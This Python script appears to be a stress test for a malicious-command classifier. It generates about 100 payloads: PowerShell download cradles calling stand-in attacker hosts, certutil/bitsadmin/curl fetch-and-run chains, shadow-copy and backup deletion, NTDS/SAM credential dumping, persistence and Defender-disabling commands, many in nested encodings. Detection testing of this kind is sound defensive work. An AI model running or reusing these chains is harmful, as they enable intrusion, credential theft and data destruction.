"""100-payload long/multi-layer stress test — Feb 2026.

Every payload is either LONG (500+ chars) or MULTI-LAYER (2-3 nested
encodings) or MULTI-STAGE (5-15 command-line chain). Runs through the
ensemble with LLM disabled to prove deterministic robustness.
"""
from __future__ import annotations
import asyncio
import base64
import codecs
import random
import sys
from typing import List, Tuple

sys.path.insert(0, "/app/backend")
from routers import decode_guidance as dg


def b64(s):    return base64.b64encode(s.encode()).decode()
def b64u16(s): return base64.b64encode(s.encode("utf-16le")).decode()
def hexb(s):   return s.encode().hex()
def rot13(s):  return codecs.encode(s, "rot13")
def urlenc(s): return "".join(f"%{ord(c):02x}" if not c.isalnum() else c for c in s)


DOMAINS = ["evil.io","c2.attacker.net","phish.co.uk","malicious.top",
           "beacon.zone","stager.host","0xdead.beef","drop.zone",
           "hack.link","apt.example","cobalt.strike","payload.host",
           "empire.dev","invoke.me","malware.wtf","exfil.now",
           "callback.io","implant.zone","dump.host","loader.top"]

BINS = ["powershell","certutil","rundll32","regsvr32","mshta","bitsadmin",
        "wmic","schtasks","installutil","msiexec","netsh","curl","wget",
        "esentutl","vssadmin","wbadmin","bcdedit","diskshadow","dotnet","dnx"]

# ── 40 long single-line encoded payloads ──────────────────────────
def long_encoded():
    out = []
    for i in range(40):
        d = random.choice(DOMAINS)
        core = (f"IEX(New-Object Net.WebClient).DownloadString('http://{d}"
                f"/stage{i}.ps1')" +
                " -UseBasicParsing -Headers @{User-Agent='Mozilla/5.0'}" +
                " -Verbose -ErrorAction SilentlyContinue" * (i % 3 + 1))
        variants = [
            ("triple-b64 nested", b64(b64(b64(core)))),
            ("b64 → hex → b64",  b64(hexb(b64(core)))),
            ("hex → b64 → urlenc", urlenc(b64(hexb(core)))),
            ("PS -enc utf16le · long", "powershell.exe -NoP -sta -NonI -W Hidden -Enc " + b64u16(core * 2)),
            ("certutil chain b64",
             f"certutil.exe -urlcache -split -f https://{d}/stage.b64 stage.b64 & " +
             "certutil.exe -decode stage.b64 stage.exe & " +
             f"powershell -c \"IEX (Get-Content stage.exe -Raw)\" -EncodedCommand " + b64u16(core)),
        ]
        name, payload = variants[i % 5]
        out.append((f"long-encoded #{i:02d} · {name} · {d}", "encoded", payload))
    return out

# ── 30 heavily-layered / multi-stage chains ───────────────────────
def deep_chains():
    out = []
    templates = [
        # 15-stage cobalt-strike-style attack
        [
            "certutil -urlcache -f http://{d}/loader.b64 loader.b64",
            "certutil -decode loader.b64 loader.dll",
            "rundll32 loader.dll,EntryPoint",
            "bitsadmin /transfer j http://{d}/stage2.exe C:\\Temp\\s2.exe",
            "wmic process call create \"C:\\Temp\\s2.exe\"",
            "schtasks /create /sc onlogon /tn Update /tr C:\\Temp\\s2.exe /f",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v U /d C:\\Temp\\s2.exe /f",
            "netsh advfirewall firewall add rule name=Allow dir=in action=allow protocol=TCP localport=4444",
            "vssadmin.exe delete shadows /all /quiet",
            "wbadmin delete catalog -quiet",
            "bcdedit /set {default} recoveryenabled No",
            "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d ntds.dit",
            "reg save HKLM\\SAM sam.hive",
            "reg save HKLM\\SYSTEM sys.hive",
            "wmic /node:10.0.0.5 process call create cmd.exe",
        ],
        # 10-stage empire launcher
        [
            "powershell -nop -w hidden -enc " + b64u16("IEX(iwr http://{d}/e.ps1)"),
            "certutil -decode payload.b64 payload.dll",
            "regsvr32 /s /n /u /i:http://{d}/s.sct scrobj.dll",
            "mshta.exe http://{d}/x.hta",
            "installutil /LogToConsole=false /U C:\\a.exe",
            "msiexec /i https://{d}/setup.msi /quiet",
            "curl -sL http://{d}/y.sh | bash",
            "wget -qO- http://{d}/z.sh | sh",
            "netsh interface portproxy add v4tov4 listenport=445 connectaddress=10.0.0.9",
            "schtasks /create /sc daily /tn Health /tr calc.exe /f",
        ],
        # 5-stage ransomware precursor
        [
            "vssadmin delete shadows /all /quiet",
            "wbadmin delete catalog -quiet",
            "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
            "wmic shadowcopy delete",
            "cipher.exe /w:C:\\",
        ],
    ]
    for tmpl in templates:
        for d in DOMAINS[:10]:
            payload = "\n".join(step.replace("{d}", d) for step in tmpl)
            out.append((f"chain-{len(tmpl):02d}-stage · {d[:20]}",
                        "multi_line_chain", payload))
    return out[:30]

# ── 20 long plaintext malicious ───────────────────────────────────
def long_plaintext():
    out = []
    ops = [
        "Get-EventLog -LogName Security -Newest 500 | Where-Object {{$_.EventID -in 4624,4625,4634,4648,4672}} | Select TimeGenerated,EventID,Message | Export-Csv logs.csv",
        "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 1000 | Where-Object {{$_.Id -in 4103,4104}} | Select TimeCreated,Message",
        "Get-Process | Where-Object {{$_.Path -match 'Temp|AppData|Roaming'}} | Format-List Name,Id,Path,Company,Description",
        "Get-CimInstance -ClassName Win32_StartupCommand | Format-List Name,Command,Location,User",
        "Get-ScheduledTask | Where-Object {{$_.Actions.Execute -match 'powershell|cmd|mshta|rundll32|regsvr32'}} | Select TaskName,TaskPath,State",
        "Get-NetTCPConnection -State Established | Where-Object {{$_.RemotePort -notin 80,443,53,25,110,143}} | Select LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess",
        "Get-LocalUser | Where-Object {{$_.Enabled -eq $true -and $_.PasswordExpires -eq $null}} | Format-List Name,LastLogon,PasswordLastSet,SID",
        "Add-MpPreference -ExclusionPath 'C:\\Temp','C:\\Users\\Public','C:\\ProgramData\\Microsoft\\Windows\\Start Menu'",
        "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true",
        "wmic /node:10.0.0.5 process call create \"powershell -NoP -W hidden -Enc " + b64u16("iex(iwr http://c/f.ps1)") + "\"",
    ]
    for i, op in enumerate(ops):
        out.append((f"long-plaintext #{i:02d}", "plaintext_malicious",
                    op * 2))  # Duplicate to make it long
    for i, op in enumerate(ops):
        out.append((f"long-plaintext-repeat #{i:02d}", "plaintext_malicious",
                    op + " -Force -Verbose " + op[:200]))
    return out[:20]

# ── 10 multi-layer with cipher wrapping ───────────────────────────
def cipher_wrapped():
    out = []
    for i, d in enumerate(DOMAINS[:10]):
        core = f"IEX(iwr 'http://{d}/x.ps1').Content"
        rotted = rot13(core)
        out.append((f"rot13-then-b64 #{i}", "encoded",
                    "powershell -c " + b64(f"iex ((\"{rotted}\" -replace ...))") ))
    return out


ALL = long_encoded() + deep_chains() + long_plaintext() + cipher_wrapped()
random.shuffle(ALL)
print(f"Total payloads: {len(ALL)}")


async def main():
    async def llm_off(_):
        return {"kind":"clean_text","confidence":0.0,"signals":[],
                "recommended":[],"guidance_steps":[]}
    dg._classify_llm = llm_off
    hints = await dg._load_dynamic_patterns()
    persona = await dg._load_active_persona()

    buckets = {}
    lens = []
    for name, expected, payload in ALL:
        lens.append(len(payload))
        det = dg._classify_deterministic(payload)
        dyn = dg._classify_dynamic_regex(payload, hints)
        per = dg._classify_persona(payload, persona)
        llm = await dg._classify_llm(payload)
        vote = dg._ensemble_vote(
            {"deterministic":det,"dynamic-regex":dyn,"persona":per,"llm":llm}, payload)
        got = vote["kind"]
        ok = (
            got == expected or
            (expected == "encoded" and got in {"encoded","multi_line_chain","plaintext_malicious"}) or
            (expected == "multi_line_chain" and got in {"multi_line_chain","encoded","plaintext_malicious"}) or
            (expected == "plaintext_malicious" and got == "plaintext_malicious")
        )
        b = buckets.setdefault(expected, {"ok":0,"total":0,"misses":[]})
        b["total"] += 1
        if ok: b["ok"] += 1
        else: b["misses"].append(f"{name} → {got}")

    print(f"\nPayload length: min={min(lens)}  max={max(lens)}  mean={sum(lens)//len(lens)}")
    print(f"\n{'━'*70}\n{len(ALL)} LONG/MULTI-LAYER PAYLOADS · AI-OFF\n{'━'*70}")
    tot=tot_ok=0
    for cat, s in buckets.items():
        pct = 100*s["ok"]//max(1,s["total"])
        tot += s["total"]; tot_ok += s["ok"]
        print(f"  {cat:24s}  {s['ok']:3d}/{s['total']:3d}  ({pct:3d}%)")
        for m in s["misses"][:3]:
            print(f"      ✗ {m}")
        if len(s["misses"])>3:
            print(f"      ... +{len(s['misses'])-3} more")
    print(f"\n  {'TOTAL':24s}  {tot_ok:3d}/{tot:3d}  ({100*tot_ok//max(1,tot)}%)")

asyncio.run(main())
